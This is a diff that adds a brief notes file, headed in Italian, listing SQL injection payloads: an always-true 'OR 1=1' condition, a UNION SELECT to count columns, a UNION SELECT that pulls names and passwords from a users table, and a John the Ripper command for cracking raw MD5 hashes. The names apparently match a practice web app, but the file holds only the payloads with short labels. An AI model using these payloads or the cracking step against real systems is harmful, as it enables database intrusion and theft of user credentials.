@@ -1,0 +1,12 @@
+Condizione sempre vera
+'OR 1=1 #
+
+Quante colonne?
+' UNION SELECT null, null  --
+
+Trovare la password:
+'UNION SELECT first_name, password FROM users #
+
+Cracking John
+john --format=raw-md5 hash.txt
+
